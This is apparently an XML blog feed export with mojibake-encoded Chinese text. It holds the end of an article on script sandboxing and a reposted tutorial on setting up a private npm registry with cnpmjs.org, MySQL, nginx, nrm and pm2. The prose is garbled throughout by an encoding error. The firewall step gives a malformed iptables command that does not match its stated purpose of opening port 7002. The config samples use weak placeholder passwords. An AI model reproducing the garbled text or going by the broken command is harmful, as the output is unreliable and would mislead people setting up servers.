æ˜¯å¾ˆå›°éš¾çš„ï¼Œåªä¾èµ–è½¯ä»¶æ¨¡å—ä½œä¸ºæ²™ç®±æŠ€æœ¯ï¼Œé˜²æ­¢ä¸å—ä¿¡ä»»ä»£ç ç”¨äºéæ­£å½“ç”¨é€”æ˜¯ç³Ÿç³•çš„å†³å®šã€‚è¿™å¯èƒ½ä¿ƒä½¿äº‘ä¸Š SAAS åº”ç”¨ä¸å®‰å…¨ï¼Œå› ä¸ºé€šè¿‡é€ƒé€¸å‡ºæ²™ç®±è¿›ç¨‹å¤šä¸ªç§Ÿæˆ·é—´çš„æ•°æ®å¯èƒ½è¢«è®¿é—®ã€‚å› æ­¤è‡ªå®šä¹‰è„šæœ¬æ‰§è¡Œåªé’ˆå¯¹å†…éƒ¨å¼€æ”¾ï¼Œå¤–éƒ¨çš„å¿…é¡»å¾—ç»è¿‡ä¸¥æ ¼å®¡æ ¸æ‰èƒ½æ‰§è¡Œã€‚è¦å°½é‡é¿å¼€æ‰§è¡ŒåŠ¨æ€æ‰§è¡Œè„šæœ¬ï¼Œå¦‚æœå®åœ¨é¿ä¸å¼€æˆ–éœ€è¦è¿™ä¸ªåŠŸèƒ½ï¼Œå¸Œæœ›æœ¬æ–‡èƒ½å¤Ÿå¯¹ä½ æœ‰äº›å¸®åŠ©ã€‚ ä½œè€…ï¼šè®¾è®¡ç¨¿æ™ºèƒ½ç”Ÿæˆä»£ç é“¾æ¥ï¼šhttps://juejin.im/post/5f02cd47e51d453488380f15æ¥æºï¼šæ˜é‡‘è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åˆ†åˆ†é’Ÿæ•™ä¼šä½ æ­å»ºä¼ä¸šçº§çš„ npm ç§æœ‰ä»“åº“]]></title>
    <url>%2F2020%2F06%2F23%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%88%86%E5%88%86%E9%92%9F%E6%95%99%E4%BC%9A%E4%BD%A0%E6%90%AD%E5%BB%BA%E4%BC%81%E4%B8%9A%E7%BA%A7%E7%9A%84%20npm%20%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5eef64de518825658c1ad1f6 å‰è¨€npm ä½œä¸ºä¸€ç§åŒ…ç®¡ç†å·¥å…·ï¼Œæ— è®ºä½ æ˜¯æ³›å‰ç«¯è¿˜æ˜¯å¤§å‰ç«¯éƒ½å·²ç»ç¦»ä¸å¼€å®ƒã€‚å®ƒçš„å‡ºç°æ–¹ä¾¿äº†ä¸‡åƒå°‘å¹´ã€‚è®©æˆ‘ä»¬è·¨è¿‡äº† Ctrl+Cã€Ctrl+V ï¼Œé€šè¿‡ npm install x çš„æ–¹å¼å°†åˆ«äººçš„ä¼˜ç§€ä»£ç æ¨¡å—å¼•å…¥åˆ°è‡ªå·±çš„é¡¹ç›®ä¸­ã€‚è¿™äº›ä¼˜ç§€çš„æ¨¡å—èƒ½è¢«å…±äº«çš„åŸå› ï¼Œä¸€æ–¹é¢æ˜¯æœ‰ npm è¿™ä¹ˆä¸€ä¸ªåŒ…ç®¡ç†å·¥å…·ï¼Œå¦å¤–å°±æ˜¯ npm ä»“åº“ã€‚ å¯¹äº npm ä»“åº“ï¼Œå¦‚æœä½ è¿˜åœç•™åœ¨ä½¿ç”¨ npm æˆ–è€… cnpm è¿™ç±»å®˜æ–¹æºçš„æƒ…å†µä¸‹ã€‚é‚£ä¹ˆä½ æœ‰å¿…è¦æƒ³æƒ³å¦‚ä½•æ­å»ºä¸€ä¸ªç§æœ‰çš„ npm ä»“åº“ã€‚ä¸‹é¢ä»ä¸‰ä¸ªæ–¹é¢è®²è§£ä¼ä¸šçº§ npm ç§æœ‰ä»“åº“æ­å»ºé‚£äº›äº‹å„¿ï¼Œåˆ†åˆ†é’Ÿæ•™ä¼šä½ ã€‚ ä¸ºä»€ä¹ˆéœ€è¦æ­å»ºå…¬å¸çš„ç§æœ‰ npm ä»“åº“ å¦‚ä½•æ­å»ºç§æœ‰ä»“åº“ æ­å»ºç§æœ‰ä»“åº“æ‰©å±•ç¯‡ ä¸ºä»€ä¹ˆéœ€è¦æ­å»ºå…¬å¸çš„ç§æœ‰ npm ä»“åº“ç…§æƒ¯ä¾‹ï¼Œå…ˆè®²è®²ä¸ºå•¥è¦æ­å»ºç§æœ‰ä»“åº“ã€‚ç›®å‰å·²ç»æœ‰å¾ˆå¤šæˆç†Ÿçš„ npm æºå¯ä»¥ä½¿ç”¨ï¼Œæ¯”å¦‚ï¼š npm : registry.npmjs.org/ cnpm : r.cnpmjs.org/ taobao: registry.npm.taobao.org/ nj:registry.nodejitsu.com/ npmMirror skimdb.npmjs.com/registry/ â€¦. åœ¨å·²ç»æœ‰å¦‚æ­¤å¤šå…¬å…±ä»“åº“çš„æƒ…å†µä¸‹ï¼Œæ˜¯å¦æœ‰å¿…è¦æä¸€å¥—ç§æœ‰ ä»“åº“ï¼Ÿé‡å¤â€é€ è½®å­â€ï¼Ÿè¿˜æ˜¯è‡ªå—¨ï¼Ÿå¦‚æœä»ä¸‹é¢å‡ æ–¹é¢æ¥è€ƒè™‘çš„è¯ï¼Œæˆ–è®¸èƒ½æ‰“æ¶ˆå¿ƒä¸­çš„ç–‘é—®ã€‚ 1. ç¨³å®šæ€§ é¦–å…ˆæ˜¯ç½‘ç»œè®¿é—®ç¨³å®šæ€§ï¼Œç§æœ‰ä»“åº“å› ä¸ºæ˜¯è‡ªå·±å…¬å¸åœ¨ç»´æŠ¤ï¼Œæœ‰ä»€ä¹ˆé—®é¢˜èƒ½ç¬¬ä¸€æ—¶é—´å¤„ç†ï¼Œæ¯”å¦‚æœåŠ¡å®•æœºâ€¦å…¶æ¬¡èµ„æºçš„ç¨³å®šæ€§ï¼Œè¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœå“ªå¤©ä½ ä¾èµ–çš„æŸä¸ªå¾ˆé‡è¦çš„æ¨¡å—çªç„¶è¢«ä½œè€…åˆ äº†ï¼Œé‚£æ˜¯ä¸æ˜¯å®ŒçŠŠå­äº†ï¼Œæ¯•ç«Ÿæˆ‘ä»¬å¾ˆå¤šæ—¶å€™éƒ½å¥‰è¡Œçš„æ˜¯â€œæ‹¿æ¥ä¸»ä¹‰â€ï¼Œä¸€æ—¦é‡è§è¿™ç§æƒ…å†µï¼ŒåŸºæœ¬ä¸Šå…¨æŠ“çã€‚å¦‚æœæœ‰ç§æœ‰ä»“åº“ï¼Œä¸Šé¢çš„é—®é¢˜å¯ä»¥ä»å®¹é¢å¯¹ï¼Œæœ‰æ•ˆçš„ä¿éšœäº†ä¸šåŠ¡ç¨³å®šã€‚ 2. ç§å¯†æ€§ æ¯ä¸ªå…¬å¸éƒ½æœ‰å’Œè‡ªå·±ä¸šåŠ¡å¼ºç›¸å…³çš„æ¨¡å—ï¼Œæˆ–è€…å¯¹æŸäº›å¼€æºæ¨¡å—è¿›è¡Œä¸ªæ€§åŒ–çš„æ”¹é€ ï¼Œæ”¹é€ åçš„æ¨¡å—åªæ»¡è¶³æœ¬å…¬å¸çš„ä¸šåŠ¡åœºæ™¯ï¼Œè¿™äº›æ¨¡å—æˆ‘ä»¬å¹¶ä¸å¸Œæœ›å‘å¸ƒåˆ°å…¬å…±çš„ä»“åº“ä¸­å»ï¼Œè¿™æ—¶å°±å¯ä»¥å‘å¸ƒåˆ°è‡ªå·±çš„ç§æœ‰ä»“åº“åœ¨å…¬å¸å†…éƒ¨å…±äº«ã€‚ 3. å®‰å…¨æ€§ æœ‰äº†ç§æœ‰ä»“åº“åï¼Œå¯ä»¥åœ¨ npm æ¨¡å—çš„è´¨é‡å’Œå®‰å…¨ä¸Šåšæ–‡ç« ï¼Œèƒ½å¤Ÿæœ‰æ•ˆçš„é˜²æ²»æ¶æ„ä»£ç æ”»å‡»ã€‚ ç»¼ä¸Šï¼Œæ­å»ºè‡ªå·±å…¬å¸çš„ç§æœ‰ä»“åº“å®Œå…¨æœ‰å¿…è¦ï¼Œè¿™å¹¶ä¸æ˜¯ç§€ã€‚å½“ç„¶ï¼Œå¦‚æœä½ æ‰€åœ¨çš„å…¬å¸æ¯”è¾ƒ mini ï¼Œå¯¹äºä¸Šé¢çš„å‡ ç‚¹éœ€æ±‚å¹¶ä¸æ˜¯é‚£ä¹ˆè¿«åˆ‡ï¼Œä½¿ç”¨å…¬å…±ä»“åº“ä¹ŸæŒºå¥½ã€‚ä½†å½“å…¬å¸å‘å±•åˆ°ä¸€å®šè§„æ¨¡ï¼Œåœ¨æœªæ¥å¯é¢„è§çš„æƒ…å†µä¸‹ï¼Œé‚£å°±æ˜¯æ—¶å€™å‡†å¤‡æ­å»ºè‡ªå·±çš„ç§æœ‰ä»“åº“äº†ã€‚ å¦‚ä½•æ­å»ºç§æœ‰ npm ä»“åº“ç›®å‰å·²ç»æœ‰è®¸å¤šæˆç†Ÿå¼€æºæ–¹æ¡ˆï¼Œé€‰æ‹©ç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šä¸å¤±ä¸ºä¸€ç§è‰¯ç­–ã€‚è¿™é‡Œé€‰æ‹©cnpmjs.orgæ–¹æ¡ˆï¼ŒåŸå› æœ‰ä¸‰ï¼š ç›®å‰å›½å†…åƒæ·˜å®è¿™æ ·çš„å¤§å‚å†…éƒ¨ä¹Ÿæ˜¯é€‰æ‹©çš„å®ƒï¼Œè¶³ä»¥è¯æ˜å®ƒçš„å¯é è¡Œå’Œç¨³å®šæ€§ æ‰©å±•æ€§å¼º é…ç½®å¤šæ ·åŒ– å½“ç„¶ç¼ºç‚¹ä¹Ÿä¸æ˜¯æ²¡æœ‰ï¼Œå°±æ˜¯éƒ¨ç½²æœ‰é‚£ä¹ˆä¸€ä¸¢ä¸¢å¤æ‚ã€‚ å‡†å¤‡å·¥ä½œå…µé©¬æœªåŠ¨ï¼Œç²®è‰å…ˆè¡Œï¼Œæ—¢ç„¶æ˜¯æ­å»ºä¼ä¸šçº§çš„åº”ç”¨ï¼ŒåŸºç¡€ç¯å¢ƒå¾—å¤‡å¥½ã€‚ Linux æœåŠ¡å™¨ node ç¯å¢ƒ æ•°æ®åº“( Mysql ) nginx å¤§æ¦‚å°±è¿™äº›ï¼Œå¦‚æœä½ åªæ˜¯ç†Ÿæ‚‰ä¸€ä¸‹ï¼Œæ­ç€ç©å„¿ã€‚ä¹Ÿä¸ä¸€å®šå¾—ç”¨ Linux æœåŠ¡å™¨ï¼ŒWindows ä¹Ÿè¡Œï¼Œä½†æ˜¯å¦‚æœæ˜¯ä½œä¸ºçº¿ä¸Šåº”ç”¨ï¼Œå»ºè®®è¿˜æ˜¯ä½¿ç”¨ Linux æœåŠ¡å™¨ï¼Œæ¯•ç«Ÿ Linux çš„ç¨³å®šæ€§åœ¨é‚£é‡Œæ‘†ç€ã€‚ ä¸‹é¢çš„ç¤ºä¾‹æ˜¯åœ¨äº‘æœåŠ¡å™¨ï¼ˆUbuntuï¼‰ä¸Šå®Œæˆçš„ã€‚ å®‰è£… å®‰è£…cnpmjs.org å»ºè®®é€šè¿‡ git å°† cnpmjs.org çš„é¡¹ç›®æºç å…‹éš†åˆ°æœåŠ¡å™¨æœ¬åœ°æŸä¸ªç›®å½•ä¸‹ã€‚æˆ–è€…å°†ä»£ç forkåˆ°è‡ªå·±gitä»“åº“åï¼Œå†åŸºäºå†…éƒ¨ä»“åº“è¿›è¡Œéƒ¨ç½²ï¼Œè¿™æ ·æ–¹ä¾¿ä»¥åå¯¹æºç è¿›è¡Œä¸ªæ€§åŒ–çš„æ”¹é€ ã€‚ 12git clone https://github.com/cnpm/cnpmjs.org.gitå¤åˆ¶ä»£ç  å®‰è£…é¡¹ç›®ä¾èµ–: 12npm iå¤åˆ¶ä»£ç  å®‰è£…å®Œæˆåæ‰¾åˆ°é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶config/index.js ï¼Œè¿™é‡Œé…ç½®æ–‡ä»¶éå¸¸å¤šï¼Œåˆšå¼€å§‹å¯ä»¥åªå…³æ³¨ä¸‹é¢å‡ é¡¹å³å¯ï¼Œè¯¦ç»†é…ç½®æˆ³è¿™é‡Œã€‚ æœåŠ¡è®¿é—®ç«¯å£ 1234registryPort: 7001, //ä»“åº“æœåŠ¡è®¿é—®ç«¯å£webPort: 7002, //webç«™ç‚¹è®¿é—®ç«¯å£bindingHost: &apos;&apos;, //ç›‘å¬ç»‘å®šçš„ Hostï¼Œé»˜è®¤127.0.0.1ï¼Œå¤–ç½‘è®¿é—®æ³¨é‡Šæ‰æ­¤é¡¹å³å¯ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¸ä¼šæŠŠæˆ‘ä»¬å†…éƒ¨ç«¯å£æš´éœ²å‡ºå»ï¼Œå¯ä»¥åœ¨nginxå±‚åšä¸€ä¸ªè½¬å‘ï¼Œæ‰€ä»¥è¿™ä¸ªé…ç½®å¯ä»¥æ³¨é‡Šæ‰ã€‚å¦‚æœç›´æ¥å¤–ç½‘è®¿é—®ï¼Œé…ç½®ä¸º 0.0.0.0å¤åˆ¶ä»£ç  æ•°æ®åº“é…ç½® 12345678910111213141516171819database: &#123; db: &apos;npm&apos;,æ•°æ®åº“åç§° username: &apos;admin&apos;,//ç”¨æˆ· password: &apos;admin123&apos;,//å¯†ç  // æ•°æ®åº“ç±»å‹ // - ç›®å‰æ”¯æŒ &apos;mysql&apos;, &apos;sqlite&apos;, &apos;postgres&apos;, &apos;mariadb&apos; dialect: &apos;mysql&apos;,//é»˜è®¤æ˜¯sqliteï¼Œæˆ‘é€‰æ‹©çš„mysql host: &apos;127.0.0.1&apos;, //æ•°æ®åº“æœåŠ¡åœ°å€ port: 3306, // ç«¯å£ // æ•°æ®åº“è¿æ¥æ± ä½¿ç”¨é»˜è®¤é…ç½®å°±å¥½ // ç›®å‰åªæ”¯æŒ mysql å’Œ postgresql (since v1.5.0) pool: &#123; maxConnections: 10, minConnections: 0, maxIdleTime: 30000 &#125;, ...//å…¶ä»–çš„æš‚æ—¶ä¸ç”¨å…³æ³¨&#125;,å¤åˆ¶ä»£ç  æ˜¯å¦å¯ç”¨ç§æœ‰æ¨¡å¼ 12enablePrivate: false,//é»˜è®¤ä¸å¯ç”¨å¤åˆ¶ä»£ç  ç§æœ‰æ¨¡å¼ä¸‹ï¼Œåªæœ‰ç®¡ç†å‘˜æ‰èƒ½å‘å¸ƒæ¨¡å—ã€‚éç®¡ç†å‘˜å‘å¸ƒæ¨¡å—å¼å‘½åå¿…é¡»ä»¥ scopes å­—æ®µå¼€å¤´ä¾‹å¦‚ï¼š@catfly/packagenameã€‚ å‘å¸ƒå‰ç¼€ 12scopes: [&apos;@catfly&apos;],å¤åˆ¶ä»£ç  è¿™ä¸ªå’Œå¯ç”¨éç§æœ‰æ¨¡å¼é…å¥—ä½¿ç”¨ï¼Œéç§æœ‰æ¨¡å¼è¦å‘å¸ƒå¿…é¡»é…ç½®è¯¥é¡¹ã€‚ ç®¡ç†å‘˜è´¦å·é…ç½® 123456admins: &#123; fengmk2: &apos;fengmk2@gmail.com&apos;, admin: &apos;admin@cnpmjs.org&apos;, dead_horse: &apos;dead_horse@qq.com&apos;,&#125;å¤åˆ¶ä»£ç  å¦‚æœå¯ç”¨ç§æœ‰æ¨¡å¼ï¼Œåªæœ‰è¯¥é…ç½®é¡¹ä¸­çš„ç”¨æˆ·å¯ä»¥å‘å¸ƒç§æœ‰åŒ…ã€‚è‡³äºå…¶ä»–çš„é…ç½®é¡¹æš‚æ—¶ä¸ç”¨å…³æ³¨ï¼Œåé¢æ ¹æ®éœ€è¦åœ¨é€æ¸é…ç½®èµ·æ¥ã€‚ åŒæ­¥æ¨¡å¼ 123456// åŒæ­¥æ¨¡å¼é€‰é¡¹// none: ä¸è¿›è¡ŒåŒæ­¥ï¼Œåªç®¡ç†ç”¨æˆ·ä¸Šä¼ çš„ç§æœ‰æ¨¡å—ï¼Œå…¬å…±æ¨¡å—ç›´æ¥ä»ä¸Šæ¸¸è·å–// exist: åªåŒæ­¥å·²ç»å­˜åœ¨äºæ•°æ®åº“çš„æ¨¡å—// all: å®šæ—¶åŒæ­¥æ‰€æœ‰æºregistryçš„æ¨¡å—syncModel:&apos;exist&apos;å¤åˆ¶ä»£ç  æ•°æ®åº“ æˆ‘é€‰æ‹©çš„ mysql ï¼Œè¿™é‡Œä¸ä»‹ç»æ€ä¹ˆå®‰è£… mysql äº†ï¼Œæœ‰éœ€è¦è¯·æˆ³è¿™é‡Œã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥é€‰æ‹©å…¶ä»–æ•°æ®åº“ï¼Œç›®å‰æ”¯æŒmysql ã€ sqlite ã€ postgres ã€ mariadb ï¼Œé»˜è®¤æ˜¯ sqlite ã€‚ å…ˆæ£€æŸ¥ä¸€ä¸‹æ•°æ®åº“æœåŠ¡çŠ¶æ€ï¼Œç¡®ä¿æ•°æ®åº“æœåŠ¡æ²¡æ¯›ç—…: ç™»å½•æ•°æ®åº“ 12mysql -u root -p test123456å¤åˆ¶ä»£ç  åˆ›å»ºæ•°æ®åº“ 12create database npm;å¤åˆ¶ä»£ç  æŸ¥çœ‹æ•°æ®åº“åˆ—è¡¨: åˆ›å»ºæ•°æ®åº“è¡¨ cnpmjs.org é¡¹ç›® docs ç›®å½•ä¸‹å·²ç»ç»™æˆ‘ä»¬å¤‡å¥½äº†åˆ›å»ºæ•°æ®åº“çš„è„šæœ¬ db.sql ã€‚æ‰§è¡Œï¼š 12source docs/db.sql;å¤åˆ¶ä»£ç  é»˜è®¤å½“å‰æ“ä½œè·¯å¾„å°±åœ¨ cnpmjs.org é¡¹ç›®ä¸‹ï¼Œå¦‚æœä¸æ˜¯ï¼Œè¯·ç”¨ db.sql çš„ç»å¯¹è·¯å¾„ã€‚ æŸ¥çœ‹ç»“æœ: ä¸Šé¢ä¸¤æ­¥å®Œæˆåï¼Œå°±å¯ä»¥å°†é¡¹ç›®è·‘èµ·æ¥ä¸€ç¹èŠ³å®¹äº†ã€‚å› ä¸ºæˆ‘ä»¬é€šè¿‡ git å…‹éš†çš„ï¼Œæ‰€ä»¥éœ€è¦è¿›å…¥åˆ°é¡¹ç›®ç›®å½•ä¸‹æ‰§è¡Œå¯åŠ¨æœåŠ¡çš„å‘½ä»¤ 12npm run startå¤åˆ¶ä»£ç  å¯åŠ¨æˆåŠŸåï¼Œè®¿é—® web é¡µé¢ï¼Œå‘ç°ä¹‹å‰é…ç½®æ–‡ä»¶ä¸­çš„ web ç«¯å£ 7002 è®¿é—®ä¸äº†ã€‚ è¿™æ˜¯å› ä¸ºæœåŠ¡å™¨é˜²ç«å¢™çš„åŸå› ï¼Œå¯ä»¥é€‰æ‹©å…³é—­é˜²ç«å¢™ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼ä¸æ¨èï¼›å¦å¤–ä¸€ç§å°±æ˜¯å¼€æ”¾æŒ‡å®šç«¯å£ã€‚ 12iptables -A INPUT -p tcp --drop -j 7002 DROPå¤åˆ¶ä»£ç  å¦‚æœä½ æ˜¯ä½¿ç”¨çš„äº‘æœåŠ¡å™¨ï¼Œéœ€è¦å»äº‘æœåŠ¡æ§åˆ¶å°ï¼Œæ–°å¢å®‰å…¨ç»„ï¼Œå°†æš´éœ²çš„ç«¯å£æ”¾å¼€ã€‚ ç«¯å£å¼€æ”¾åï¼Œè®¿é—® web é¡µé¢ï¼šxxx.xxx.xxx.xx:7002ï¼Œå°±å¯ä»¥çœ‹è§ç†Ÿæ‚‰çš„ cnpm é¡µé¢äº†ã€‚ åœ¨ä¸Šé¢è¿™å¼ çš„è®¿é—®åœ°å€å¯ä»¥çœ‹åˆ°ï¼Œç”¨äº†åŸŸåï¼Œå¹¶ä¸æ˜¯ç”¨çš„ IP+ ç«¯å£çš„å½¢å¼ï¼Œå› ä¸ºä½œä¸ºä¸€ä¸ªä¼ä¸šçº§çš„åº”ç”¨ï¼ŒIP+ ç«¯å£çš„æ–¹å¼å°±å¦‚åŒè£¸å¥”ä¸€æ ·ï¼Œå»ºè®®é‡‡ç”¨åŸŸåçš„æ–¹å¼ã€‚æˆ‘åœ¨è‡ªå·±çš„äº‘æœåŠ¡åŸŸåç®¡ç†ä¸‹æ–°å¢äº†ä¸€ä¸ªå­åŸŸåã€‚ ç„¶åé…ç½® nginx å°† IP å’ŒåŸŸåè¿›è¡Œç»‘å®šï¼Œç»Ÿä¸€ä½¿ç”¨é»˜è®¤çš„ 80 ç«¯å£ï¼Œå°½é‡ä¸è¦å°†ç§æœ‰ä»“åº“æœåŠ¡çš„çœŸå®ç«¯å£å’Œ IP æš´éœ²å‡ºæ¥ã€‚è¿™é‡Œé¡ºä¾¿æŠŠ nginx é…ç½®ä¹Ÿè¯´ä¸€ä¸‹ï¼Œå¦‚æœä½ èƒ½æ¥å— IP+ ç«¯å£è®¿é—®çš„æ–¹å¼ï¼Œå¯ä»¥è·³è¿‡ä¸‹é¢è¿™ä¸€æ­¥ã€‚ nginxé…ç½® å¦‚æœæ²¡æœ‰å®‰è£…nginxï¼Œæˆ³è¿™é‡Œã€‚æ‰¾åˆ° nginx é…ç½®æ–‡ä»¶ï¼Œåœ¨ conf.d æ–‡ä»¶å¤¹ä¿¡æ¯æ–°å¢ npm.conf é…ç½®æ–‡ä»¶ï¼Œè¿™æ ·åŠŸèƒ½æ¸…æ¥šæ˜ç™½ï¼Œå› ä¸ºå¾ˆå¤šæ—¶å€™ nginx ä¸æ˜¯åªä»£ç†è¿™ä¸ªä¸€ä¸ªæœåŠ¡ã€‚ 1234567891011121314151617181920212223server&#123; listen 80; server_name www.mirrors.catfly.vip; #charset koi8-r; #access_log logs/host.access.log main; location / &#123; proxy_pass http://127.0.0.1:7002/; #ä»£ç†åˆ°cnpmjs.orgæä¾›çš„webæœåŠ¡ proxy_set_header X-Real-IP $remote_addr; &#125; location /registry/ &#123; proxy_pass http://127.0.0.1:7001/; # ä»£ç†åˆ°cnpmjs.orgæä¾›çš„æ³¨å†ŒæœåŠ¡ proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125;&#125;å¤åˆ¶ä»£ç  é‡å¯ nginx : 12service nginx restartå¤åˆ¶ä»£ç  æ£€æŸ¥ nginx çŠ¶æ€ï¼Œé˜²æ­¢é…ç½®é”™è¯¯ï¼Œå¯¼è‡´é‡å¯å¤±è´¥ã€‚ é€šè¿‡ä¸Šé¢çš„ç¯å¢ƒæ­å»ºå’Œéƒ¨ç½²ï¼ŒåŸºæœ¬å·¥ä½œå°±å®Œæˆäº†ï¼Œä¸‹é¢å¼€å§‹éªŒè¯åŠŸèƒ½ã€‚ åŠŸèƒ½éªŒè¯åœ¨éªŒè¯ä¹‹å‰æ¨èå®‰è£…ä¸€ä¸ª npm æºç®¡ç†æ¨¡å— nrm ï¼Œæœ‰äº†å®ƒæˆ‘ä»¬å¯ä»¥åœ¨å„ç§æºä¹‹é—´è‡ªç”±åˆ‡æ¢ã€‚ 12npm i nrm -gå¤åˆ¶ä»£ç  å®‰è£…æˆåŠŸåæ–°å¢æˆ‘ä»¬è‡ªå·±çš„ç§æœ‰æºåˆ°nrmæºåˆ—è¡¨ä¸­ã€‚ 12nrm add catfly http://www.mirrors.catfly.vip/registryå¤åˆ¶ä»£ç  åˆ‡æ¢åˆ°ç§æœ‰æºï¼š 12nrm use catflyå¤åˆ¶ä»£ç  è¿™ä¸ªæ—¶å€™æœ¬åœ°æ‰§è¡Œ npm æ“ä½œçš„æ—¶å€™å°±ä¼šå»æ‰¾åˆ°æˆ‘ä»¬è‡ªå·±çš„ç§æœ‰åœ°å€ã€‚ ç§æœ‰åŒ…å‘å¸ƒ æ³¨å†Œç”¨æˆ·ï¼š 12npm adduserå¤åˆ¶ä»£ç  ç™»å½•ç§æœ‰ä»“åº“ï¼š 12npm loginå¤åˆ¶ä»£ç  ç™»å½•æˆåŠŸåï¼Œå‘å¸ƒ npm ï¼Œåœ¨å·²å‡†å¤‡å¥½çš„æ¨¡å—ç›®å½•æ‰§è¡Œ: 12npm publishå¤åˆ¶ä»£ç  è¿™ä¸ªæ—¶å€™å¯èƒ½ä¼šå‡ºç°å„ç§é”™è¯¯ï¼Œä¸»è¦æ˜¯403æƒé™é—®é¢˜ï¼Œå› ä¸ºç§æœ‰ä»“åº“åœ¨ä¸åŒæ¨¡å¼ä¸‹éœ€è¦æ»¡è¶³ä¸åŒçš„æ¡ä»¶ï¼Œä¾‹å¦‚ï¼š åœ¨éç§æœ‰æ¨¡å¼ï¼ˆ enablePrivate: falseï¼‰ä¸‹ï¼Œå½“ç”¨æˆ·ä¸ç”¨å…·å¤‡ç®¡ç†å‘˜æƒé™ï¼Œæ¨¡å—å‘½åå‰ç¼€å¿…é¡»å¸¦æœ‰é…ç½®ä¸­è§„å®šçš„scope ï¼Œå¦‚æœä¸å­˜åœ¨æˆ–è€… scopes ä¸­ä¸åŒ…å«è¯¥ scope å°±ä¼šæŠ¥é”™ã€‚ åœ¨ç§æœ‰æ¨¡å¼ï¼ˆenablePrivate: trueï¼‰ä¸‹ï¼Œå¦‚æœç”¨æˆ·ä¸åœ¨é…ç½®æ–‡ä»¶çš„ admins ä¸­ï¼Œåˆ™ä¸å…è®¸æ‰§è¡Œå‘å¸ƒæ“ä½œï¼Œåè¿‡æ¥å¦‚æœåœ¨ï¼Œé‚£ä¹ˆä»–çš„æƒé™å°±éå¸¸å¤§äº†ï¼Œä¸ä»…èƒ½å‘å¸ƒè¿˜èƒ½åˆ é™¤ã€‚æ‰€ä»¥çœŸå®åœºæ™¯ä¸‹ä¸è¦è®©ç®¡ç†å‘˜è´¦å·æ³›æ»¥ã€‚ åŒ…ä¸‹è½½å®‰è£… å‘å¸ƒæˆåŠŸåï¼Œå°è¯•å®‰è£…å‘å¸ƒçš„ç§æœ‰åŒ…: 12npm i xxxxxå¤åˆ¶ä»£ç  æ²¡æ¯›ç—…ã€‚ Webå·¥ä½œå° è®¿é—®ç§æœ‰ä»“åº“çš„webç«™ç‚¹ é€šè¿‡è¿™ä¸ª ç«™ç‚¹å¯ä»¥å¯¹ç§æœ‰åŒ…çš„å‘å¸ƒã€åˆ é™¤ä»¥åŠä¸‹è½½è¿›è¡Œç»Ÿè®¡ï¼Œè¿˜å¯ä»¥ç§æœ‰åŒ…æœç´¢åŠŸèƒ½ã€‚ä¹Ÿå¯ä»¥å¯¹è¿™ä¸ª webç«™ç‚¹è¿›è¡Œä¸ªæ€§åŒ–æ”¹é€ ã€‚ä»£ç ã€æ•°æ®éƒ½åœ¨æˆ‘ä»¬è¿™è¾¹ï¼Œæƒ³æ€ä¹ˆé€ å°±æ€ä¹ˆé€ ã€‚ ç§æœ‰npmä»“åº“æ­å»ºæ‰©å±•ç¯‡åœ¨çœŸå®çš„ä¼ä¸šçº§åº”ç”¨ä¸­ï¼Œåœ¨ä¸Šé¢çš„åŸºç¡€ä¸Šè¿˜å¯ä»¥è¿›è¡Œæ‰©å±•ï¼Œä¸‹é¢ä»‹ç»ä¸€ä¸‹å¯ä»¥æ‰©å±•çš„å‡ ä¸ªæ–¹é¢ï¼š è¿›ç¨‹ç®¡ç†æ¨èä½¿ç”¨ pm2 è¿›è¡Œè¿›ç¨‹ç®¡ç†ï¼Œè™½ç„¶é¡¹ç›®æœ¬èº«æä¾›äº†npm run startå’Œnpm run stopçš„èƒ½åŠ›ï¼Œä½†æ˜¯è¿™å¯¹äºä¸€ä¸ªä¼ä¸šçº§çš„åº”ç”¨æ¥è¯´è¿˜æ˜¯å¤ªå¼±äº†ï¼Œä½¿ç”¨ pm2 çš„å¥½å¤„å¦‚ä¸‹ï¼š éšæ—¶éšåœ°å¤šè¿›ç¨‹ç®¡ç† å®Œå–„çš„ç›‘æ§æœºåˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ™°åœ°çœ‹è§æ•´ä¸ªé›†ç¾¤çš„æ¨¡å¼ã€çŠ¶æ€ï¼ŒCPU åˆ©ç”¨ç‡ç”šè‡³æ˜¯å†…å­˜å¤§å° è´Ÿè½½å‡è¡¡ è¿›ç¨‹å®ˆæŠ¤ â€¦ å…¨å±€å®‰è£…pm2 12npm i pm2 -gå¤åˆ¶ä»£ç  å¯åŠ¨é¡¹ç›® 12pm2 start ./dispatch.js //dispatch.jsåœ¨cnpmjs.orgé¡¹ç›®çš„æ ¹ç›®å½•ä¸‹å¤åˆ¶ä»£ç  æ‰§è¡Œå®Œåï¼Œå¯ä»¥çœ‹è§è¯¥æœåŠ¡çš„åŸºæœ¬ä¿¡æ¯ï¼Œç®€æ´æ˜äº†ã€‚ æŸ¥çœ‹æœåŠ¡è¿›ç¨‹ä¿¡æ¯ 12pm2 monit dispatch //diapatchä¸ºå½“å‰è¿›ç¨‹nameå¤åˆ¶ä»£ç  è¿™é‡Œå¯ä»¥å®æ—¶æŸ¥çœ‹è¿›ç¨‹è¿è¡Œçš„è¯¦ç»†ä¿¡æ¯ï¼Œæ–¹ä¾¿å¹³æ—¶é¡¹ç›®çš„ç»´æŠ¤ã€‚pm2 